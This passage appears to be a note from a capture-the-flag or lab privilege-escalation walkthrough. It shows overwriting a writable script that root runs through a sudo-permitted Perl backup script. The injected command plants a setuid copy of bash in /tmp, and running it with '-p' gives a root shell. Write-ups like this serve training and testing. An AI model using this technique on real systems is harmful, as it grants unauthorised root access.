
---
- Contents of `backup.pl`:
	- ![[Pasted image 20250502153819.png]]
- We can modify `copy.sh`file:
```
echo "cp /bin/bash /tmp/bash; chmod +s /tmp/bash;" > /etc/copy.sh
```
- Run the `backup.pl`file as `root`:
	- `sudo /usr/bin/perl /home/itguy/backup.pl`
	- ![[Pasted image 20250502154440.png]]
- `/tmp/bash -p`
	- ![[Pasted image 20250502154458.png]]
